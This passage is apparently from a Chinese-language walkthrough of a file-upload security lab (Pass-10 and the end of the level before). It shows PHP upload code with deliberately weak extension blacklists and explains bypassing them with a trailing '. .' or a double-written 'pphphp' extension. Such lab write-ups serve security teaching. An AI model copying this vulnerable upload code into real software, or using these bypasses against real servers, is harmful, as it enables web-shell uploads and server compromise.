        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

注意最后保存的文件名只是去除点后的文件名，因此只需要加`. .`即可绕过。

## Pass-10

源码：

PHP

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

熟悉的双写绕过，把后缀名改成`pphphp`即可。